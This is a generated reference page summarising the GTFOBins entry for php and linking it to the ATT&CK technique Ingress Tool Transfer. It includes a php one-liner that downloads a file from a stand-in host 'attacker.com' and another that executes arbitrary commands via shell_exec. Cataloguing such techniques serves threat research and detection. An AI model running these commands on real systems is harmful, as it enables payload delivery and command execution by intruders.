---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# php

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `php` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/php` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for php covering command, download, file-read, file-write, reverse-shell, shell, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/php.md)
- Source verification: [source record](../../sources/gtfobins/php.md)

## Aliases

- `php`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: php -r '$c=file_get_contents("http://attacker.com/path/to/input-file"); file_put_contents("/path/to/output-file", $c);' |

## Source Verification

[source record](../../sources/gtfobins/php.md)

## Evidence Excerpt

```text
_body: ''
_name: php
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/php
functions:
command:
- code: php -r 'echo shell_exec("/path/to/command");'
contexts:
sudo: null
```
